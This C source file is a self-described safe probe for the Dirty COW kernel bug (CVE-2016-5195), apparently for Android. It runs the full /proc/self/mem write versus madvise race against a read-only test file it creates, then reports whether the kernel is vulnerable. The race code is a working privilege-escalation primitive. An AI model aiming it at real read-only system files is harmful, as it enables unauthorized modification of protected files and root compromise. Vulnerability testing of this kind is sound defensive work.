/*
 * dirtycow_test.c — Safe Dirty COW (CVE-2016-5195) probe
 *
 * Tests whether the kernel is vulnerable to the Dirty COW race condition.
 * Creates a test file owned by shell, chmod 0444, then attempts the race.
 * If the race succeeds on a read-only file, the kernel is vulnerable.
 *
 * The race: madvise(MADV_DONTNEED) vs write to /proc/self/mem
 * - Thread 1: writes to the mmap'd region via /proc/self/mem
 * - Thread 2: calls madvise(MADV_DONTNEED) to discard the COW copy
 * - If the timing is right, the write goes to the file's page cache
 *
 * Cross-compile: aarch64-linux-musl-gcc -static -O2 -o dirtycow_test dirtycow_test.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>

#define TEST_FILE "/data/local/tmp/dirtycow_testfile"
#define ORIGINAL_CONTENT "AAAAAAAAAAAAAAAA"  /* 16 bytes */
#define REPLACE_CONTENT  "BBBBBBBBBBBBBBBB"  /* 16 bytes */
#define RACE_ITERATIONS 100000

static void *mapped;
static size_t mapped_size;
static int stop_threads;

/* Thread 1: write to /proc/self/mem at the mmap'd address */
static void *writer_thread(void *arg) {
    char *replace = REPLACE_CONTENT;
    size_t replace_len = strlen(replace);

    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }

    for (int i = 0; i < RACE_ITERATIONS && !stop_threads; i++) {
        /* Seek to the mmap'd address and write */
        lseek(fd, (off_t)mapped, SEEK_SET);
        write(fd, replace, replace_len);
    }

    close(fd);
    return NULL;
}

/* Thread 2: madvise(MADV_DONTNEED) to discard the private COW copy */
static void *madvise_thread(void *arg) {
    for (int i = 0; i < RACE_ITERATIONS && !stop_threads; i++) {
        madvise(mapped, mapped_size, MADV_DONTNEED);
    }
    return NULL;
}

int main(void) {
    printf("=== Dirty COW (CVE-2016-5195) Test ===\n");
    printf("Kernel: ");
    fflush(stdout);
    system("uname -r");

    /* Step 1: Create test file with known content */
    printf("\n[1] Creating test file: %s\n", TEST_FILE);
    int fd = open(TEST_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        perror("create test file");
        return 1;
    }
    write(fd, ORIGINAL_CONTENT, strlen(ORIGINAL_CONTENT));
    close(fd);

    /* Make it read-only */
    chmod(TEST_FILE, 0444);
    printf("    Content: '%s' (read-only 0444)\n", ORIGINAL_CONTENT);

    /* Step 2: Verify we cannot write normally */
    printf("\n[2] Verifying normal write fails...\n");
    fd = open(TEST_FILE, O_WRONLY);
    if (fd >= 0) {
        printf("    WARNING: File opened for writing despite 0444! (owner write?)\n");
        close(fd);
        /* Even so, continue — dirty cow bypasses via page cache, not fd */
    } else {
        printf("    Good: open(O_WRONLY) failed: %s\n", strerror(errno));
    }

    /* Step 3: mmap the file read-only, MAP_PRIVATE */
    printf("\n[3] Memory-mapping file (MAP_PRIVATE, PROT_READ)...\n");
    fd = open(TEST_FILE, O_RDONLY);
    if (fd < 0) {
        perror("open for mmap");
        return 1;
    }

    struct stat st;
    fstat(fd, &st);
    mapped_size = st.st_size;

    mapped = mmap(NULL, mapped_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mapped == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }
    close(fd);

    printf("    Mapped at: %p, size: %zu\n", mapped, mapped_size);
    printf("    Current content: '%.16s'\n", (char *)mapped);

    /* Step 4: Race — writer vs madvise */
    printf("\n[4] Starting race (%d iterations)...\n", RACE_ITERATIONS);
    printf("    Writer thread: writes '%s' via /proc/self/mem\n", REPLACE_CONTENT);
    printf("    Madvise thread: MADV_DONTNEED discards COW copies\n");
    fflush(stdout);

    stop_threads = 0;
    pthread_t t1, t2;
    pthread_create(&t1, NULL, writer_thread, NULL);
    pthread_create(&t2, NULL, madvise_thread, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    printf("    Race complete.\n");

    /* Step 5: Check if the file on disk was modified */
    printf("\n[5] Checking file on disk...\n");

    /* Drop page cache influence — re-read from disk */
    munmap(mapped, mapped_size);

    fd = open(TEST_FILE, O_RDONLY);
    if (fd < 0) {
        perror("reopen");
        return 1;
    }

    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);

    printf("    File content: '%s'\n", buf);

    if (memcmp(buf, REPLACE_CONTENT, strlen(REPLACE_CONTENT)) == 0) {
        printf("\n*** VULNERABLE! Dirty COW race succeeded! ***\n");
        printf("*** The read-only file was modified on disk. ***\n");
        printf("*** CVE-2016-5195 is EXPLOITABLE on this kernel. ***\n");

        /* Restore the file */
        chmod(TEST_FILE, 0644);
        fd = open(TEST_FILE, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            write(fd, ORIGINAL_CONTENT, strlen(ORIGINAL_CONTENT));
            close(fd);
        }
        chmod(TEST_FILE, 0444);
        printf("\n    (Test file restored to original content)\n");
    } else if (memcmp(buf, ORIGINAL_CONTENT, strlen(ORIGINAL_CONTENT)) == 0) {
        printf("\n    File unchanged. Kernel appears PATCHED against Dirty COW.\n");
    } else {
        printf("\n    File has unexpected content! Possible partial race.\n");
        printf("    This suggests the kernel MAY be vulnerable.\n");
    }

    /* Cleanup */
    unlink(TEST_FILE);
    printf("\n[6] Cleanup done. Test file removed.\n");

    return 0;
}
